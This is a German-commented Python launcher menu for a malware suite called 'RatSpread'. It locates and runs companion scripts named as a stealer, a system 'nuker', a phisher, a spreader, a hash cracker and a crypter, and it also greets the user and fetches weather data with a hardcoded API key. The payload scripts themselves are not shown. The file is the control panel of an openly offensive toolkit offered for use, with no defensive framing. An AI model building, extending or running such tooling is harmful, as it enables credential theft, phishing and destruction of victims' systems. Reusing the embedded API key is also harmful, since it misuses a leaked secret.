import os
import subprocess
import time
from datetime import datetime
import sys
import threading
import locale
import platform
import requests
import importlib
import Settings
try:
    import RatSpreadVars
except ImportError:
    print("RatSpreadVars konnte nicht importiert werden.")
    RatSpreadVars = type('RatSpreadVars', (object,), {'ascii': '', 'titel': ''})

try:
    import Settings
    username = Settings.username
    city = Settings.city
    birthday = Settings.birthday
    api_key = Settings.api_key
except ImportError:
    print("Settings konnte nicht importiert werden.")
    username = 'DefaultUser'
    city = 'DefaultCity'
    birthday = '01.01.1900'
    api_key = '41f0e608343eaec9c51769c4b41c019a'

def reload_settings():
    importlib.reload(Settings)

DEBUG_MODE = True
SCRIPT_CHECK_ENABLED = False

start_stealer = None
Rat_crypter = None
Rat_encrypter = None
Rat_setup = None
Rat_phisher = None
Rat_spreader = None
Rat_nuker = None
Rat_crawler = None
Rat_dehasher = None
Rat_save = None

username = None
city = None

today_date = datetime.now().strftime("%d.%m.%Y")
aktuelle_zeit = time.strftime("%H:%M")
current_os = platform.system().lower()
api_key = "41f0e608343eaec9c51769c4b41c019a"

def debug(message):
    if DEBUG_MODE:
        print(f"DEBUG: {message}")

def find_script(script_name):
    for root, dirs, files in os.walk("."):
        if script_name in files:
            return os.path.join(root, script_name)
    return None

def check_script_executable(script_path):
    if not script_path:
        return False
    try:
        result = subprocess.run(["python", script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=5)
        return result.returncode == 0
    except Exception as e:
        debug(f"Fehler beim Ausführen des Skripts {script_path}: {e}")
        return False

def get_weather():
    if not city:
        return "Stadt nicht gesetzt."

    url = f"http://api.openweathermap.org/data/2.5/forecast?q={city}&units=metric&appid={api_key}"
    response = requests.get(url)
    data = response.json()

    if response.status_code != 200:
        return f"Fehler bei der API-Anfrage: {data.get('message', 'Unbekannter Fehler')}"
    
    if 'list' in data:
        current_temp = data['list'][0]['main']['temp']
        current_time = datetime.fromtimestamp(data['list'][0]['dt'])
        threshold_temp = 29
        exceed_time = None

        for forecast in data['list']:
            temp = forecast['main']['temp']
            forecast_time = datetime.fromtimestamp(forecast['dt'])

            if temp > threshold_temp:
                exceed_time = forecast_time
                break

        temp_info = f"Aktuelle Temperatur in {city}: {current_temp}°C um {current_time.strftime('%H:%M')}"
        if exceed_time:
            temp_info += f"\nDie Temperatur wird voraussichtlich {threshold_temp}°C überschreiten am {exceed_time.strftime('%d.%m.%Y %H:%M')}."
        else:
            temp_info += f"\nDie Temperatur wird in den nächsten 5 Tagen voraussichtlich nicht {threshold_temp}°C überschreiten."
        
        return temp_info
    else:
        return "Fehler: Keine Vorhersagedaten gefunden."

def initialize_scripts():
    global start_stealer, Rat_crypter, Rat_encrypter, Rat_setup, Rat_phisher, Rat_spreader, Rat_nuker, Rat_crawler, Rat_dehasher, Rat_save

    start_stealer = find_script("start_stealer_win.bat")
    Rat_crypter = find_script("Ratcodierung.py")
    Rat_encrypter = find_script("Ratuncode.py")
    Rat_setup = find_script("start_setup.py")
    Rat_phisher = find_script("RatPhisher.py")
    Rat_spreader = find_script("RatSpreader.py")
    Rat_nuker = find_script("RatSpreadSystemNuker.py")
    Rat_crawler = find_script("RatCrawler.py")
    Rat_dehasher = find_script("RatDeHasher.py")
    Rat_save = find_script("RatSave.py") 

    if SCRIPT_CHECK_ENABLED:
        start_stealer_executable = current_os == "windows" and bool(start_stealer)
        rat_crypter_executable = check_script_executable(Rat_crypter)
        rat_encrypter_executable = check_script_executable(Rat_encrypter)
        rat_setup_executable = check_script_executable(Rat_setup)
        rat_phisher_executable = check_script_executable(Rat_phisher)
        rat_spreader_executable = check_script_executable(Rat_spreader)
        rat_nuker_executable = check_script_executable(Rat_nuker)
        rat_crawler_executable = check_script_executable(Rat_crawler)
        rat_dehasher_executable = check_script_executable(Rat_dehasher)
        rat_save_executable = check_script_executable(Rat_save) 
    else:
        start_stealer_executable = True
        rat_crypter_executable = True
        rat_encrypter_executable = True
        rat_setup_executable = True
        rat_phisher_executable = True
        rat_spreader_executable = True
        rat_nuker_executable = True
        rat_crawler_executable = True
        rat_dehasher_executable = True
        rat_save_executable = True 

    return {
        "start_stealer": start_stealer_executable,
        "Rat_crypter": rat_crypter_executable,
        "Rat_encrypter": rat_encrypter_executable,
        "Rat_setup": rat_setup_executable,
        "Rat_phisher": rat_phisher_executable,
        "Rat_spreader": rat_spreader_executable,
        "Rat_nuker": rat_nuker_executable,
        "Rat_crawler": rat_crawler_executable,
        "Rat_dehasher": rat_dehasher_executable,
        "Rat_save": rat_save_executable  
    }

def print_menu(script_status):
    global aktuelle_zeit
    if not DEBUG_MODE:
        os.system("cls" if os.name == "nt" else "clear")
        os.system("color 0a" if os.name == "nt" else "")

    print(f"{RatSpreadVars.ascii}")
    print(f"{RatSpreadVars.titel}")

    willkommen()
    weather_info = get_weather()
    if weather_info:
        print(weather_info)
    print(" ")

    def mark_script(name, status):
        if status:
            return f"{name}: {'🗸'}"
        else:
            return f"{name}: {'✗'} (Nicht ausführbar)"

    print(mark_script('Stealer', script_status['start_stealer']))
    print(mark_script('Nuker', script_status['Rat_nuker']))
    print(mark_script('Crawler', script_status['Rat_crawler']))
    print(mark_script('DeHasher', script_status['Rat_dehasher']))
    print(mark_script('Crypter', script_status['Rat_crypter']))
    print(mark_script('Encrypter', script_status['Rat_encrypter']))
    print(mark_script('Setup', script_status['Rat_setup']))
    print(mark_script('Phisher', script_status['Rat_phisher']))
    print(mark_script('RatSave', script_status['Rat_save'])) 
    
    print(" ")

    for key, value in menu_options.items():
        print(f"{key}: {value}")

def willkommen():
    global username, city

    stunde = int(time.strftime("%H"))
    locale.setlocale(locale.LC_TIME, 'de_DE.UTF-8')
    wochentag = datetime.now().strftime("%A")
    if 5 <= stunde < 12:
        gruß = "Guten Morgen"
        grußend = "Morgens"
    elif 12 <= stunde < 18:
        gruß = "Guten Tag"
        grußend = " "
    else:
        gruß = "Guten Abend"
        grußend = "Abends"

    geburtstag = get_birthday()
    if geburtstag and geburtstag == today_date:
        gruß = f"Herzlichen Glückwunsch zum Geburtstag, {username}!"
    
    print(f"{gruß}, {username}! Heute ist {wochentag} der {today_date}")
    print(f"Wir haben {aktuelle_zeit} {grußend}")
def get_birthday():
    try:
        with open('Settings.py', 'r') as settings_file:
            for line in settings_file:
                if line.startswith('birthday'):
                    return line.split('=')[1].strip().strip("'")
    except FileNotFoundError:
        return None
    except IOError as e:
        error_menu(f"Fehler beim Lesen der Datei: {e}")

def set_birthday(date):
    global birthday
    birthday = date
    with open('Settings.py', 'a') as settings_file:
        settings_file.write(f"birthday = '{date}'\n")

def option1():
    if start_stealer:
        debug("Stealer-Skript wird ausgeführt")
        subprocess.run(["cmd", "/c", "call", start_stealer])
    else:
        debug("Stealer-Skript nicht gefunden.")
        print("start_stealer_win.bat konnte nicht gefunden werden.")

def option2():
    if Rat_nuker:
        debug("Nuker-Skript wird ausgeführt")
        subprocess.run(["python", Rat_nuker])
    else:
        debug("Nuker-Skript nicht gefunden.")
        print("RatSpreadSystemNuker.py konnte nicht gefunden werden.")

def option3():
    if Rat_crawler:
        debug("Crawler-Skript wird ausgeführt")
        subprocess.run(["python", Rat_crawler])
    else:
        debug("Crawler-Skript nicht gefunden.")
        print("RatCrawler.py konnte nicht gefunden werden.")

def option4():
    if Rat_dehasher:
        debug("DeHasher-Skript wird ausgeführt")
        subprocess.run(["python", Rat_dehasher])
    else:
        debug("DeHasher-Skript nicht gefunden.")
        print("RatDeHasher.py konnte nicht gefunden werden.")

def verschluesselungs_menu():
    debug("Verschlüsselungsmenü aufgerufen")

    verschluesselungs_menu_options = {
        1: "Verschlüsseln",
        2: "Entschlüsseln",
        3: "Zurück zum Hauptmenü"
    }

    while True:
        print("Verschlüsselungsmenü:")
        for key, value in verschluesselungs_menu_options.items():
            print(f"{key}: {value}")
        
        try:
            option = int(input('Bitte wähle eine Option: '))
            if option == 1:
                if Rat_crypter:
                    debug("Verschlüsselungsskript wird ausgeführt")
                    subprocess.run(["python", Rat_crypter])
                else:
                    debug("Verschlüsselungsskript nicht gefunden.")
                    print("Ratcodierung.py konnte nicht gefunden werden.")
            elif option == 2:
                if Rat_encrypter:
                    debug("Entschlüsselungsskript wird ausgeführt")
                    subprocess.run(["python", Rat_encrypter])
                else:
                    debug("Entschlüsselungsskript nicht gefunden.")
                    print("Ratuncode.py konnte nicht gefunden werden.")
            elif option == 3:
                debug("Zurück zum Hauptmenü")
                break
            else:
                debug(f"Ungültige Option im Verschlüsselungsmenü ausgewählt: {option}")
                print('Ungültige Option. Bitte eine Zahl zwischen 1 und 3 eingeben.')
        except ValueError:
            debug("Ungültige Eingabe im Verschlüsselungsmenü: keine Zahl")
            print('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
        except Exception as e:
            error_menu(str(e))

def option7():
    if Rat_setup:
        debug("Setup-Skript wird ausgeführt")
        subprocess.run(["python", Rat_setup])
    else:
        debug("Setup-Skript nicht gefunden.")
        print("start_setup.py konnte nicht gefunden werden.")

def option8():
    if Rat_phisher:
        debug("Phisher-Skript wird ausgeführt")
        subprocess.run(["python", Rat_phisher])
    else:
        debug("Phisher-Skript nicht gefunden.")
        print("RatPhisher.py konnte nicht gefunden werden.")

def option9():
    if Rat_save:  
        debug("RatSave-Skript wird ausgeführt")
        subprocess.run(["python", Rat_save])
    else:
        debug("RatSave-Skript nicht gefunden.")
        print("RatSave.py konnte nicht gefunden werden.")

menu_options = {
    1: "Stealer starten",
    2: "Nuker starten",
    3: "Crawler starten",
    4: "DeHasher starten",
    5: "Verschlüsselungsmenü starten",
    6: "Setup starten",
    7: "Phisher starten",
    8: "RatSave starten", 
    9: "Beenden"  
}

def error_menu(error_message):
    debug(f"Fehler aufgetreten: {error_message}")
    print(f"Ein Fehler ist aufgetreten: {error_message}")
    input("Drücke Enter, um fortzufahren...")

if __name__ == '__main__':
    script_status = initialize_scripts()

    while True:
        try:
            print_menu(script_status)
            option = ''
            try:
                option = int(input('Bitte wähle eine Option: '))
            except ValueError:
                debug("Ungültige Eingabe: keine Zahl")
                print('Ungültige Eingabe. Bitte eine Zahl eingeben ...')
                continue

            if option == 1:
                option1()
            elif option == 2:
                option2()
            elif option == 3:
                option3()
            elif option == 4:
                option4()
            elif option == 5:
                verschluesselungs_menu()
            elif option == 6:
                option7()
            elif option == 7:
                option8()
            elif option == 8:
                option9()  
            elif option == 9:
                debug("Programm wird beendet")
                print('Danke für die Nutzung des Programms.')
                sys.exit()
            else:
                debug(f"Ungültige Option ausgewählt: {option}")
                print('Ungültige Option. Bitte eine Zahl zwischen 1 und 9 eingeben.')
        except KeyboardInterrupt:
            debug("Strg+C im Hauptmenü gedrückt, ignoriert")
        except Exception as e:
            error_menu(str(e))
